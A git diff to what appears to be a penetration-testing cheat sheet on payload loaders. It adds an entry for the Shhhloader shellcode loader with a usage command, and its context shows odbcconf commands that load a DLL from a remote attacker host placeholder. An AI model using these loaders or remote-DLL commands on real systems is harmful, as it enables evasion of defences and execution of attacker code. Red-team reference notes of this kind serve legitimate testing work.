@@ -9,6 +9,7 @@
 - [Donut](#donut)
 - [Freeze](#freeze)
 - [ScareCrow](#scarecrow)
+- [Shhhloader](#shhhloader)
 
 ## Resources
 
@@ -404,4 +405,12 @@ For `.cpl-Files` a simple double click is enough to execute them.
 ```c
 PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
 PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
+```
+
+## Shhhloader
+
+> https://github.com/icyguider/Shhhloader
+
+```c
+$ python3 Shhhloader.py <FILE>.bin -p <FILE>.exe
 ```
